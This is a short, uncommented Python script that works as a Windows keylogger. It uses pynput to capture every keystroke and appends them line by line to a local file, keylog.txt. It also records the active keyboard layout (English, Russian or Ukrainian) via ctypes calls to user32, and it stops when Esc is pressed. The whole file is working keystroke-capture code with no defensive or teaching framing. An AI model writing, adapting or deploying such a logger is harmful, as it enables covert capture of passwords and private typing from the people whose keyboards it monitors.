from pynput.keyboard import Key, KeyCode, Listener
from ctypes import *

def write_line():
    global line
    fp=open("keylog.txt","a")
    fp.write(line)
    fp.close()
    line = ''

def get_lang():
    user32 = windll.user32
    hwnd = user32.GetForegroundWindow()
    threadID = user32.GetWindowThreadProcessId(hwnd, None)
    CodeLang = hex(user32.GetKeyboardLayout(threadID))
    if CodeLang == '0x4090409':
        return 'En'
    if CodeLang == '0x4190419':
        return 'Ru'
    if CodeLang == '-0xf57fbde':
        return 'Ua'
    return str(CodeLang)

def get_key_name(key):
    if isinstance(key, KeyCode):
        return key.char.strip("'")
    else:
        return '[' + str(key) + ']'

def on_press(key):
    global line
    if key == Key.enter:
        write_line()
    elif key == Key.esc:
        write_line()
        return False
    elif key == Key.backspace:
        line = line[:-1]
    elif key == Key.space:
        line += ' '
    else:
        line += get_key_name(key)

line = '[[' + get_lang() + ']]'
fp=open("keylog.txt","w")
fp.write(line)
fp.close()
with Listener(on_press=on_press) as listener:
    listener.join()
